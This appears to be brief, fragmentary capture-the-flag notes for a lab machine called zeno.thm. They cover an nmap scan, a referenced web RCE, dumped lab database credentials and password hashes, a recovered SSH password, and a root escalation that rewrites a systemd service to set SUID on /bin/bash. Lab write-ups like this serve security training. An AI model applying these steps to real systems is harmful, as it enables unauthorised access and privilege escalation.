# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx zeno.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV zeno.thm
```

we got these open ports
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```


Rms hotel managent has a rce : https://www.exploit-db.com/exploits/47520

define('DB_HOST', 'localhost');
    define('DB_USER', 'root');
    define('DB_PASSWORD', 'veerUffIrangUfcubyig');
    define('DB_DATABASE', 'dbrms');


    15 | Stephen   | Omolewa            | omolewastephen@gmail.com | 81dc9bdb52d04dc20036dbd8313ed055 |           9 | 51977f38bb3afdf634dd8162c7a33691 |
|        16 | John      | Smith              | jsmith@sample.com        | 1254737c076cf867dc53d60a0364f38e |           8 | 9f2780ee8346cc83b212ff038fcdb45a |
|        17 | edward    | zeno               | edward@zeno.com          | 6f72ea079fd65aff33a67a3f3618b89c


/etc/systemd/system/multi-user.target.wants/zeno-monitoring.service
/etc/systemd/system/zeno-monitoring.service

in /etc/fstab, we see the secret_shared folder mounted and we found the password of edward
edward:FrobjoodAdkoonceanJa

we can use it to connect at SSH
Once we are connected, we can see there is a sudo right to use reboot

so we edit the zeno-monitoring.service ExecStart by : /usr/bin/chmod u+s /bin/bash
then we connect and could use suid as bash -p
